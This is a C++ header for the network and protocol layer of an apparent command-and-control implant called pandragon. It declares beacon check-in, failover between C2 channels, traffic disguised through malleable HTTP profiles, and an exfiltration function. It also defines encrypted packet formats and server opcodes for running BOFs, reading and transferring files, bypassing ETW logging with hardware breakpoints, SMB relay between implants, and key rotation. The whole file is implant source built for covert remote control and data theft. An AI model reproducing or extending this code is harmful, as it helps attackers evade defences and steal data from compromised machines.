#pragma once
#include <stdint.h>
#include <stddef.h>
#include <utility>
#include "../resolver.h"

// Forward declaration (defined in config_parser.h)
struct PCFG_ChannelMalleable;

// -- Option flags for sendData ------------------------------------------

namespace pandragon {
        enum class networkFlags:uint32_t {
        NETWORK_NO_FLAGS    = 0x00,
        NETWORK_NO_ENCRYPT  = 0x01,  // skip encryption layer (future use)
        NETWORK_NO_COMPRESS = 0x02, // skip compression (future use)
    };
}


bool initNetworkTable(functionTable* ntFt);

// Set channel security mode (true=HTTPS, false=HTTP)
// Default is HTTPS (backward compatibility)
void setChannelSecure(bool isHttps);

// Get channel security mode
bool isChannelSecure(void);

// Set SSL certificate validation (default: true = validate)
// Set to false for self-signed certs in testing
void setValidateSSL(bool validate);

// Set HTTP method for data transmission (0=GET, 1=POST)
void setHttpMethod(uint8_t method);

// Get current HTTP method
uint8_t getHttpMethod(void);

// Call once at startup before any send/get.
void initNetwork(functionTable* ntFt,
                 const wchar_t*   host,
                 const wchar_t*   checkInPath,
                 const wchar_t* userAgent,
                 uint16_t         port);  // Server port (use 0 for default: 443 for HTTPS, 80 for HTTP)

// Set beacon identity (call before any network operations)
void setBeaconIdentity(const uint8_t* beaconID, const uint8_t* cryptoKey);

// Key rotation management
bool isKeyRotationPending(void);
void clearKeyRotationPending(void);

// Set malleable network configuration from parsed BeaconConfig struct
// (call after setBeaconIdentity)
// Accepts a pointer to either a BeaconConfig (global) or PCFG_ChannelMalleable (per-channel)
// Uses has_malleable_config field in BeaconConfig to determine if malleable is present
void setMalleableConfigFromBeaconConfig(const void* beaconConfig);

// Clear all malleable config state (for TCP channels or bare channels)
void clearMalleableConfig(void);

// Set malleable config from a per-channel PCFG_ChannelMalleable
void setMalleableFromChannelMalleable(const PCFG_ChannelMalleable* chMalleable);

// Set active C2 channel: switches host/path/ua/port and resolves malleable config
// channelIndex: which channel in the config (0..channel_count-1)
// config: pointer to parsed BeaconConfig (must have channels + channel_malleable populated)
void setActiveChannel(uint8_t channelIndex, const void* config);

// Get wrapper prefix (returns empty string if not configured)
const char* getWrapperPrefix(void);

// Get wrapper suffix (returns empty string if not configured)
const char* getWrapperSuffix(void);

// Get custom HTTP header by index (returns NULL if index out of range)
// Returns header name; use getCustomHeaderValue() to get the value
const char* getCustomHTTPHeader(uint8_t index, uint16_t* name_len, uint16_t* value_len);

// Get custom HTTP header value by index
const char* getCustomHeaderValue(uint8_t index);

// Get number of custom HTTP headers
uint8_t getCustomHTTPHeaderCount(void);

// Get payload location type (0=query_param, 1=path, 2=body)
uint8_t getPayloadLocationType(void);

// Get query parameter name for payload location
const char* getPayloadParamName(void);

// Get path prefix for path location mode
const char* getPathPrefix(void);

// Get path suffix for path location mode
const char* getPathSuffix(void);

// Switch to a different C2 channel (for failover)
// Returns true on success, false on allocation failure
bool switchChannel(const wchar_t* host, const wchar_t* path, const wchar_t* userAgent, uint16_t port, uint8_t http_method = 0);

// Send initial check-in packet with BEACON_CHECK_IN opcode
// Returns true on successful transmission
bool sendCheckin(const char* sysinfo = nullptr, size_t sysinfo_len = 0);

// Gather system information into a binary payload (caller must __free)
// Returns allocated buffer, sets out_len to buffer size
char* gatherSystemInfo(size_t* out_len);

// POST content to C2. Returns true on non-null response.
// Flags control future encrypt/compress pipeline stages.
bool sendData(const char* content, uint32_t flags = static_cast<uint32_t>(pandragon::networkFlags::NETWORK_NO_ENCRYPT));


bool sendData(const void* content, size_t contentLen,
              uint32_t flags = static_cast<uint32_t>(pandragon::networkFlags::NETWORK_NO_ENCRYPT));

// GET next task from C2. Caller must __free() pair.first.
std::pair<void*, size_t> getMessage();

// GET /<targetPath>?<urlsafe_base64(content[0..contentLen])>
// contentLen is explicit so binary blobs work too.
bool sendExfil(const void*    content,
               size_t         contentLen,
               const wchar_t* targetPath); 


namespace pandragon {

    constexpr uint32_t PANDRAGON_MAGIC = 0x50414E44u; 

    enum class version_t : uint8_t {
        epoch = 0u
    };

    enum class parse_err : uint8_t {
        OK                  = 0x00,
        BUFFER_TOO_SMALL    = 0x01,  // buf < HEADER_LEN
        BAD_MAGIC           = 0x02,
        BAD_VERSION         = 0x03,
        BAD_OPCODE          = 0x04,  // opcode not in known set
        PAYLOAD_OVERFLOW    = 0x05,  // payload_len > remaining buf
        NULL_BUFFER         = 0x06,
        BAD_BEACONID        = 0x07,  /* Beaon ID sent by server isn't ours. Should NEVER happen.*/
        DECRYPTION_FAILED   = 0x08,  // XChaCha20-Poly1305 MAC verification failed
    };



    // -- Server -> Beacon opcodes ---------------------------------------------
    typedef enum class _s2b_opcode : uint8_t {
        NO_TASKS    = 0x00,
        ECHO        = 0x01,
        SLEEP       = 0x02,
        FILE_READ   = 0x04,
        DIE         = 0xFF,
        // Extended opcodes (legacy - single packet, for small files <4KB)
        BOF_EXEC      = 0x10,
        BOF_FREE      = 0x11,  // Free cached BOF by ID
        // Long-running async BOF commands
        // Payload: uint32_t task_id + uint8_t subcmd + [optional args]
        // Subcommands: 0=start, 1=abort, 2=update_args, 3=remove
        LONG_RUNNING_BOF = 0x14,
        FILE_DOWNLOAD = 0x12,  // Legacy: read entire file in one packet
        FILE_UPLOAD   = 0x13,  // Legacy: write entire file in one packet
        // Key rotation opcode
        ROTATE_KEY    = 0x1E,  // Rotate crypto key (server -> beacon)
        // Chunked file transfer opcodes (for large files)
        FILE_DOWNLOAD_START = 0x20,  // Server -> Beacon: initiate download
        FILE_DOWNLOAD_CHUNK = 0x21,  // Server -> Beacon: request chunk
        FILE_UPLOAD_START   = 0x22,  // Server -> Beacon: initiate upload
        FILE_UPLOAD_CHUNK   = 0x23,  // Server -> Beacon: send chunk
        // ETW bypass opcodes (HWBP-based)
        ETW_ENABLE    = 0x25,  // Enable ETW bypass via HWBP
        ETW_DISABLE   = 0x26,  // Disable ETW bypass (remove HWBP)
        // Relay opcodes (P2P SMB beacon)
        START_RELAY      = 0x40,  // Enable relay mode (no params)
        STOP_RELAY       = 0x41,  // Disable relay mode, drain children
        RELAY_ADD_CHILD  = 0x42,  // Add child to relay list
        RELAY_REMOVE_CHILD = 0x43,// Remove child from relay list
        RELAY_DOWN       = 0x44,  // Server -> Parent: child data downstream
    } s2b_opcode;

    // -- Beacon -> Server opcodes ---------------------------------------------
    typedef enum class _b2s_opcode : uint8_t {
        BEACON_CHECK_IN        = 0x01,
        BEACON_POLL            = 0x02,
        BEACON_TASK_RESULT     = 0x03,
        BEACON_ERROR           = 0x04,
        // Extended opcodes (legacy - single packet)
        FILE_CONTENT       = 0x10,  // Legacy: file read result (small files)
        FILE_WRITE_RESULT  = 0x11,  // Legacy: file write confirmation
        BOF_OUTPUT         = 0x12,
        LIST_FILES_RESULT  = 0x13,  // Directory listing result
        // Key rotation acknowledgment
        KEY_ROTATE_ACK     = 0x1F,  // Beacon -> Server: key rotation confirmed
        // Chunked file transfer opcodes
        FILE_DOWNLOAD_ACK  = 0x20,  // Beacon -> Server: download started/failed
        FILE_CHUNK_DATA    = 0x21,  // Beacon -> Server: file chunk data
        FILE_UPLOAD_ACK    = 0x22,  // Beacon -> Server: chunk written/failed
        // Relay opcodes (P2P SMB beacon)
        RELAY_CHILD_UP   = 0x40,  // Parent -> Server: child data upstream
    } b2s_opcode;

    // -- Wire header (both directions, same layout) --------------------------
    // Total fixed header size: 4+1+8+1+4+24+4 = 46 bytes
    // Immediately followed by `payload_len` bytes of ciphertext + 16B Poly1305 tag.
    // Padding is handled via PKCS#7 applied to plaintext before encryption.

    #pragma pack(push, 1)
    struct packet_header {
        uint32_t  magic;                // PANDRAGON_MAGIC
        version_t version;
        uint8_t   beacon_id[8];         // SHA256(OTA_key)[0:8]
        uint8_t   opcode;               // cast to s2b_opcode or b2s_opcode depending on direction
        uint32_t  seq_num;
        uint8_t   nonce[24];            // random CSPRNG per packet, for XChaCha20-Poly1305
        uint32_t  payload_len;          // byte count of (ciphertext + 16B MAC tag)
    };
    #pragma pack(pop)

    // Decoded, host-side representation (NOT packed, safe to use freely).
    struct parsed_packet {
        uint32_t  magic;
        version_t version;
        uint8_t   beacon_id[8];
        uint8_t   opcode;
        uint32_t  seq_num;
        uint8_t   nonce[24];
        uint32_t  payload_len;

        const uint8_t* payload_ptr;   // points to encrypted payload in original buffer
        uint8_t* decrypted_payload;   // points to decrypted payload (caller must __free)
        size_t   decrypted_len;       // length of decrypted payload
    };

    constexpr size_t MAC_LEN    = 16;
    constexpr size_t HEADER_LEN = sizeof(packet_header);

    // -- Packet serialization/deserialization functions -----------------------
    std::pair<parse_err, std::pair<uint8_t*, size_t>> serializePacket(
        const uint8_t beaconID[8],
        b2s_opcode opcode,
        uint32_t seq,
        const uint8_t nonce[24],
        const uint8_t* payload,
        size_t payload_len,
        const uint8_t* encryption_key,
        bool pad = false,
        uint16_t pad_max = 0
    );

    std::pair<parse_err, parsed_packet> deserializePacket(
        const uint8_t* packet_buffer,
        size_t packet_len,
        const uint8_t* encryption_key,
        bool direction_s2b = true
    );



    struct payload_sleep {
        uint32_t sleep_ms;
        uint8_t  jitter_pct;   // 0-100
    };

    // BOF_EXEC payload: uint16_t bof_len + uint32_t arg_len + bof_data[bof_len] + args[arg_len]
#pragma pack(push, 1)
    struct payload_bof_exec {
        uint16_t bof_len;
        uint32_t arg_len;
        // uint8_t bof_data[bof_len] + uint8_t args[arg_len] follow
    };

    // FILE_DOWNLOAD payload: uint16_t path_len + path[path_len]
    struct payload_file_download {
        uint16_t path_len;
        // wchar_t path[path_len] follows
    };

    // FILE_UPLOAD payload: uint16_t path_len + uint32_t file_size + path[path_len] + data[file_size]
    struct payload_file_upload {
        uint16_t path_len;
        uint32_t file_size;
        // wchar_t path[path_len] + char data[file_size] follow
    };

    // FILE_CONTENT response: uint16_t path_len + uint32_t file_size + uint8_t status + path + data
    struct payload_file_content {
        uint16_t path_len;
        uint32_t file_size;
        uint8_t  status;  // 0=success, 1=error
        // wchar_t path[path_len] + char data[file_size] follow
    };
    
    // FILE_WRITE_RESULT response: uint8_t status
    struct payload_file_write_result {
        uint8_t status;  // 0=success, 1=error
    };

    // =============================================================================
    // Key Rotation Payload Structures
    // =============================================================================

    // ROTATE_KEY: Server -> Beacon (rotate crypto key)
    // Payload: 32-byte new crypto key + 8-byte beacon ID (to verify target)
    struct payload_rotate_key {
        uint8_t new_crypto_key[32];  // New 32-byte XChaCha20 key
        uint8_t beacon_id[8];        // Target beacon ID (verify against self)
        // Beacon must acknowledge with KEY_ROTATE_ACK using OLD key before switching
    };

    // KEY_ROTATE_ACK: Beacon -> Server (acknowledge key rotation)
    // Sent with OLD key to confirm receipt, then subsequent packets use NEW key
    struct payload_key_rotate_ack {
        uint8_t status;              // 0=OK (key accepted), 1=ERROR (invalid beacon ID)
        uint8_t reserved[3];         // Padding for alignment
    };

    // =============================================================================
    // Chunked File Transfer Payload Structures
    // Default chunk size: 4096 bytes (fits comfortably in single packet)
    // Max chunk size: ~60KB (leaves room for headers in 64KB packet limit)
    // =============================================================================
    
    constexpr uint32_t DEFAULT_CHUNK_SIZE = 4096;
    constexpr uint32_t MAX_CHUNK_SIZE = 60000;
    
    // FILE_DOWNLOAD_START: Server -> Beacon (initiate file download)
    struct payload_file_download_start {
        uint16_t path_len;    // Length of path in wchar_t
        uint32_t chunk_size;  // Requested chunk size (beacon may cap at MAX_CHUNK_SIZE)
        // wchar_t path[path_len] follows
    };
    
    // FILE_DOWNLOAD_ACK: Beacon -> Server (acknowledge download start)
    struct payload_file_download_ack {
        uint32_t file_size;  // Actual file size (0 if error)
        uint8_t  status;     // 0=OK (file exists), 1=ERROR (file not found/cant read)
        // If status=0, server proceeds with FILE_DOWNLOAD_CHUNK requests
    };
    
    // FILE_DOWNLOAD_CHUNK: Server -> Beacon (request specific chunk)
    struct payload_file_download_chunk {
        uint32_t chunk_index;  // Chunk number (0, 1, 2, ...)
        uint32_t offset;       // Byte offset in file
        uint32_t chunk_size;   // How many bytes to read
    };
    
    // FILE_CHUNK_DATA: Beacon -> Server (send chunk data)
    struct payload_file_chunk_data {
        uint32_t chunk_index;  // Which chunk this is
        uint32_t offset;       // Byte offset in file
        uint32_t chunk_size;   // Actual bytes in this chunk
        uint8_t  status;       // 0=OK, 1=EOF (final chunk), 2=ERROR
        // char data[chunk_size] follows (only if status != ERROR)
    };
    
    // FILE_UPLOAD_START: Server -> Beacon (initiate file upload)
    struct payload_file_upload_start {
        uint16_t path_len;     // Length of path in wchar_t
        uint32_t file_size;    // Total file size
        uint32_t chunk_size;   // Chunk size for this transfer
        // wchar_t path[path_len] follows
    };
    
    // FILE_UPLOAD_CHUNK: Server -> Beacon (send chunk data)
    struct payload_file_upload_chunk {
        uint32_t chunk_index;  // Chunk number (0, 1, 2, ...)
        uint32_t offset;       // Byte offset in file
        uint32_t chunk_size;   // Bytes in this chunk
        uint8_t  is_last;      // 1 = final chunk, 0 = more coming
        // char data[chunk_size] follows
    };
    
    // FILE_UPLOAD_ACK: Beacon -> Server (acknowledge chunk written)
    struct payload_file_upload_ack {
        uint32_t chunk_index;  // Which chunk this acknowledges
        uint8_t  status;       // 0=OK (written), 1=ERROR (write failed), 2=RETRY
    };

    #pragma pack(pop)
    
    // =============================================================================
    // File Transfer Helper Functions
    // =============================================================================
    
    /**
     * Send file content to server (FILE_CONTENT opcode - legacy, small files only)
     * @param filePath      Wide string path to the file
     * @param fileData      Pointer to file data buffer
     * @param fileSize      Size of file data in bytes
     * @param status        0=success, 1=error
     * @return true on successful transmission
     */
    bool sendFileContent(const wchar_t* filePath, const uint8_t* fileData, size_t fileSize, uint8_t status);
    
    /**
     * Send file write result to server (FILE_WRITE_RESULT opcode - legacy)
     * @param status  0=success, 1=error
     * @return true on successful transmission
     */
    bool sendFileWriteResult(uint8_t status);
    
    // Chunked file transfer functions
    
    /**
     * Send file download acknowledgment (FILE_DOWNLOAD_ACK opcode)
     * @param fileSize  Actual file size (0 if error)
     * @param status    0=OK (file exists), 1=ERROR
     * @return true on successful transmission
     */
    bool sendFileDownloadAck(uint32_t fileSize, uint8_t status);
    
    /**
     * Send file chunk data (FILE_CHUNK_DATA opcode)
     * @param chunkIndex  Which chunk this is
     * @param offset      Byte offset in file
     * @param chunkSize   Actual bytes in this chunk
     * @param status      0=OK, 1=EOF (final chunk), 2=ERROR
     * @param data        Pointer to chunk data (NULL if status=ERROR)
     * @return true on successful transmission
     */
    bool sendFileChunkData(uint32_t chunkIndex, uint32_t offset, uint32_t chunkSize, uint8_t status, const uint8_t* data);
    
    /**
     * Send file upload acknowledgment (FILE_UPLOAD_ACK opcode)
     * @param chunkIndex  Which chunk this acknowledges
     * @param status      0=OK (written), 1=ERROR (write failed)
     * @return true on successful transmission
     */
    bool sendFileUploadAck(uint32_t chunkIndex, uint8_t status);

    /**
     * Send directory listing result to server (LIST_FILES_RESULT opcode)
     * @param entries     Array of file_entry structures
     * @param entryCount  Number of entries in the array
     * @param status      0=OK, 1=ERROR
     * @param errorMsg    Error message string (wchar_t, only if status=1)
     * @return true on successful transmission
     */
    bool sendListFilesResult(const void* entries, uint32_t entryCount, uint8_t status, const wchar_t* errorMsg = nullptr);

    /**
     * Send key rotation acknowledgment (KEY_ROTATE_ACK opcode)
     * @param status  0=OK (key accepted), 1=ERROR (invalid beacon ID)
     * @return true on successful transmission
     */
    bool sendKeyRotateAck(uint8_t status);

    /**
     * Send BOF output to server (BOF_OUTPUT opcode)
     * @param output    BOF output data buffer
     * @param len       Length of output data
     * @param task_id   Task ID for output correlation
     * @return true on successful transmission
     */
    bool sendBofOutput(const char* output, size_t len, uint32_t task_id);


} // namespace pandragon